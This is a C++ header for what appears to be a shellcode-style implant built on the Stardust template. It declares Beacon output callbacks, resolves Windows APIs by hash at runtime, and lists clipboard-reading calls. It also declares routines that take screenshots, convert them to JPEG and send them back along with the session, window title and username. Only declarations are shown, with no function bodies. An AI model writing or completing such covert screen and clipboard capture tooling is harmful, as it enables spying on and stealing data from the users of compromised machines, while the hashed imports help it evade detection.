#ifndef STARDUST_COMMON_H
#define STARDUST_COMMON_H

//
// system related headers
#include <windows.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <type_traits>
#include <concepts>
#include <cstdio>
#include <gdiplus.h>
using namespace Gdiplus;
using namespace Gdiplus::DllExports;

//
// stardust related headers
#include <constexpr.h>
#include <macros.h>
#include <memory.h>
#include <native.h>
#include <resolve.h>

// Common struct
#include "../../common/struct.h"

extern "C" auto RipData() -> uintptr_t;
extern "C" auto RipStart() -> uintptr_t;

#if defined( DEBUG )
#define DBG_PRINTF( format, ... ) { ntdll.DbgPrint( symbol<PCH>( "[DEBUG::%s::%d] " format ), symbol<PCH>( __FUNCTION__ ), __LINE__, ##__VA_ARGS__ ); }
#else
#define DBG_PRINTF( format, ... ) { ; }
#endif

#ifdef _M_X64
#define END_OFFSET 0x10
#else
#define END_OFFSET 0x10
#endif

typedef void (WINAPI *_BeaconPrintf)(int type, const char* fmt, ...);
typedef void (WINAPI *_BeaconOutput)(int type, const char * data, int len);

namespace stardust
{
    template <typename T>
    inline T symbol(T s) {
        return reinterpret_cast<T>(RipData()) - (reinterpret_cast<uintptr_t>(&RipData) - reinterpret_cast<uintptr_t>(s));
    }

    class instance {
        _BeaconPrintf BeaconPrintf;
        _BeaconOutput BeaconOutput;
        struct {
            uintptr_t address;
            uintptr_t length;
        } base = {};

        struct {
            uintptr_t handle;

            struct {
                D_API( LoadLibraryA )
                D_API( GetModuleHandleA )
                D_API( GetProcAddress )
                D_API( Sleep )
                D_API( GlobalLock )
                D_API( GlobalUnlock )
                D_API( FindAtomW )
                D_API( AddAtomW )
                D_API( DeleteAtom )
                D_API( WaitForSingleObject )
                D_API( GetLastError )
                D_API( GetHandleInformation )
                D_API( GetCurrentProcessId )
                D_API( ProcessIdToSessionId )
                D_API( DebugBreak )
            };
        } kernel32 = {
            RESOLVE_TYPE( LoadLibraryA ),
            RESOLVE_TYPE( GetModuleHandleA ),
            RESOLVE_TYPE( GetProcAddress ),
            RESOLVE_TYPE( Sleep ),
            RESOLVE_TYPE( GlobalLock ),
            RESOLVE_TYPE( GlobalUnlock ),
            RESOLVE_TYPE( FindAtomW ),
            RESOLVE_TYPE( AddAtomW ),
            RESOLVE_TYPE( DeleteAtom ),
            RESOLVE_TYPE( WaitForSingleObject ),
            RESOLVE_TYPE( GetLastError ),
            RESOLVE_TYPE( GetHandleInformation ),
            RESOLVE_TYPE( GetCurrentProcessId ),
            RESOLVE_TYPE( ProcessIdToSessionId ),
            RESOLVE_TYPE( DebugBreak ),
        };

        struct {
            uintptr_t handle;

            struct {
                D_API( GetClipboardSequenceNumber )
                D_API( OpenClipboard )
                D_API( CloseClipboard )
                D_API( GetClipboardData )
                D_API( SetProcessDPIAware )
                D_API( GetSystemMetrics )
                D_API( GetDC )
                D_API( ReleaseDC )
            };
        } user32 = {
            RESOLVE_TYPE( GetClipboardSequenceNumber ),
            RESOLVE_TYPE( OpenClipboard ),
            RESOLVE_TYPE( CloseClipboard ),
            RESOLVE_TYPE( GetClipboardData ),
            RESOLVE_TYPE( SetProcessDPIAware ),
            RESOLVE_TYPE( GetSystemMetrics ),
            RESOLVE_TYPE( GetDC ),
            RESOLVE_TYPE( ReleaseDC ),
        };

        struct {
            uintptr_t handle;

            struct {
                D_API( CreateCompatibleDC )
                D_API( CreateCompatibleBitmap )
                D_API( DeleteDC )
                D_API( SelectObject )
                D_API( BitBlt )
                D_API( DeleteObject )
            };
        } gdi32 = {
            RESOLVE_TYPE( CreateCompatibleDC ),
            RESOLVE_TYPE( CreateCompatibleBitmap ),
            RESOLVE_TYPE( DeleteDC ),
            RESOLVE_TYPE( SelectObject ),
            RESOLVE_TYPE( BitBlt ),
            RESOLVE_TYPE( DeleteObject ),
        };

        struct {
            uintptr_t handle;

            struct {
                D_API( GdiplusStartup )
                D_API( GdipCreateBitmapFromHBITMAP )
                D_API( GdiplusShutdown )
                D_API( GdipDisposeImage )
                D_API( GdipSaveImageToStream )
            };
        } gdiplus = {
            RESOLVE_TYPE( GdiplusStartup ),
            RESOLVE_TYPE( GdipCreateBitmapFromHBITMAP ),
            RESOLVE_TYPE( GdiplusShutdown ),
            RESOLVE_TYPE( GdipDisposeImage ),
            RESOLVE_TYPE( GdipSaveImageToStream ),
        };

        struct {
            uintptr_t handle;

            struct {
                D_API( getenv )
                D_API( _snprintf )
                D_API( free )
                D_API( malloc )
            };
        } msvcrt = {
            RESOLVE_TYPE( getenv ),
            RESOLVE_TYPE( _snprintf ),
            RESOLVE_TYPE( free ),
            RESOLVE_TYPE( malloc ),
        };

        struct {
            uintptr_t handle;

            struct {
                D_API( CreateStreamOnHGlobal )
            };
        } combase = {
            RESOLVE_TYPE( CreateStreamOnHGlobal ),
        };

        struct {
            uintptr_t handle;
        } ntdll = { };

    public:
        explicit instance();

        auto downloadScreenshot(char* jpg, int jpgLen, int session, char* windowTitle, int titleLen, char* username, int usernameLen) -> void;
        auto BitmapToJpeg(HBITMAP hBitmap, int quality, BYTE** pJpegData, DWORD* pJpegSize) -> BOOL;
        auto SaveHBITMAPToFile(HBITMAP hBitmap) -> BOOL;
        auto Screenshot() -> void;
        auto GetMemAddr() -> pSharedData;
        auto start(
            _In_ void* arg
        ) -> void;
    };

    template<typename T = char>
    inline auto declfn hash_string(
        _In_ const T* string
    ) -> uint32_t {
        uint32_t hash = 0x811c9dc5;
        uint8_t  byte = 0;

        while ( * string ) {
            byte = static_cast<uint8_t>( * string++ );

            if ( byte >= 'a' ) {
                byte -= 0x20;
            }

            hash ^= byte;
            hash *= 0x01000193;
        }

        return hash;
    }

}


#endif //STARDUST_COMMON_H
